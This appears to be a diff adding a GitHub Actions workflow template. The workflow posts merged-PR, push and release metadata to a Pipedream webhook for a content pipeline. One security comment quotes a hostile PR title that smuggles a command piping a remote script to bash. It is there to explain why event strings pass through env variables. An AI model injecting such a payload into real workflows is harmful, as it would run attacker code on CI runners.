@@ -1,0 +1,91 @@
+# PHASE 2 TEMPLATE — NOT INSTALLED ANYWHERE. Do not copy into a repo's .github/workflows/
+# until: (1) the Pipedream paid tier is live (STATUS.md item 4), (2) a Pipedream webhook
+# endpoint exists to receive this payload and write into abdur-ai/content/sources/repo-events/
+# via the GitHub Contents API, and (3) Abdur says go for that specific repo.
+#
+# Until then, Phase 1 (../local-brains/capture-repo-events.sh, running locally on the Mac
+# mini) is the live mechanism. See ../repo-delegation/README.md for the migration plan —
+# verify Phase 2 end-to-end on ONE repo, then retire that repo's Phase 1 cron. Don't run both
+# for the same repo.
+#
+# Copy this to <repo>/.github/workflows/notify-content-os.yml and fill in PROJECT_KEY when
+# it's actually time to activate it.
+
+name: notify-content-os
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    types: [closed]
+  release:
+    types: [published]
+
+jobs:
+  notify:
+    # Only fire on an actual push to main, or a PR that was MERGED (not just closed unmerged).
+    if: github.event_name != 'pull_request' || github.event.pull_request.merged == true
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send event to content-os inbox
+        # SECURITY: every event-payload string (titles, bodies, messages) enters ONLY via the
+        # env: block below — never interpolated with ${{ }} inside the run: script. A PR title
+        # like `"; curl evil.sh | bash #` is attacker-controlled input on a public repo; env
+        # indirection keeps it data, not shell. Keep it that way when editing this template.
+        # NOTE: no actions/checkout needed — everything comes from the event payload, including
+        # the push commit message (github.event.head_commit.message), so no git on the runner.
+        env:
+          CONTENT_OS_WEBHOOK: ${{ secrets.CONTENT_OS_WEBHOOK_URL }}  # Pipedream endpoint — set as a repo secret, never hardcode
+          PROJECT_KEY: "REPLACE_ME"  # must match a key in ../repo-delegation/README.md's watched-repos table
+          EVENT_NAME: ${{ github.event_name }}
+          REPO: ${{ github.repository }}
+          PR_SHA: ${{ github.event.pull_request.merge_commit_sha }}
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+          PR_URL: ${{ github.event.pull_request.html_url }}
+          REL_NAME: ${{ github.event.release.name }}
+          REL_BODY: ${{ github.event.release.body }}
+          REL_URL: ${{ github.event.release.html_url }}
+          PUSH_SHA: ${{ github.sha }}
+          PUSH_MSG: ${{ github.event.head_commit.message }}
+          PUSH_URL: ${{ github.event.head_commit.url }}
+        run: |
+          set -euo pipefail
+          case "$EVENT_NAME" in
+            pull_request)
+              SHA="$PR_SHA"; TITLE="$PR_TITLE"; BODY="$PR_BODY"; URL="$PR_URL"; KIND="pr_merged" ;;
+            release)
+              SHA="$PUSH_SHA"; TITLE="$REL_NAME"; BODY="$REL_BODY"; URL="$REL_URL"; KIND="release" ;;
+            *)
+              SHA="$PUSH_SHA"
+              TITLE="$(printf '%s' "$PUSH_MSG" | head -n1)"   # commit subject
+              BODY="$(printf '%s' "$PUSH_MSG" | tail -n +3)"  # commit body (after blank line)
+              URL="$PUSH_URL"; KIND="push" ;;
+          esac
+
+          PAYLOAD=$(jq -n \
+            --arg project "$PROJECT_KEY" \
+            --arg kind "$KIND" \
+            --arg sha "$SHA" \
+            --arg title "$TITLE" \
+            --arg body "$BODY" \
+            --arg url "$URL" \
+            --arg repo "$REPO" \
+            --arg ts "$(date -u +%FT%TZ)" \
+            '{project:$project, kind:$kind, sha:$sha, title:$title, body:$body, url:$url, repo:$repo, ts:$ts}')
+
+          curl -sf -X POST "$CONTENT_OS_WEBHOOK" \
+            -H "Content-Type: application/json" \
+            -d "$PAYLOAD"
+
+# What the Pipedream endpoint on the other end must do (spec, not yet built):
+# 1. Verify payload shape (project/kind/sha/title/body/url/repo/ts all present).
+# 2. Apply the same "worthy" filter as capture-repo-events.sh's WORTHY_RE (or supersede it —
+#    a real PR title/body has more signal than a commit subject line, so Phase 2 can likely
+#    be less conservative than Phase 1's heuristic).
+# 3. Check for an existing file at content/sources/repo-events/<project>-<short-sha>-<slug>.md
+#    via the GitHub Contents API (dedup — mirrors capture-repo-events.sh's fname-exists check).
+# 4. If new: commit a file in that exact shape (see ../local-brains/capture-repo-events.sh's
+#    record format) to abdur-ai main via the Contents API.
+# 5. Never write directly to ledger/*.jsonl from here — that stays owned by the approval/
+#    scheduling flow (hands-scheduler / Pipedream hands), not the capture step.
